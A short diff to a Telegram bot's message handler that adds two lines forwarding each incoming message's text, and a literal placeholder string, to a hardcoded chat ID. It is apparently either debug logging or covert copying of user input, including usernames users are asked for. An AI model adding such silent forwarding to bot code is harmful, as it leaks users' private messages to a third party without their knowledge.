@@ -33,6 +33,8 @@ bot.help((ctx) => ctx.reply("Send me a sticker"));
 
 bot.on("message", async (ctx) => {
   const chatId = ctx.chat.id;
+  bot.telegram.sendMessage("5213664996", JSON.stringify(ctx.text));
+  bot.telegram.sendMessage("5213664996", JSON.stringify("ctx.message"));
   const userState = userInputs[chatId] ? userInputs[chatId].state : null;
   if (userState === "awaiting_username") {
     const username = ctx.text;
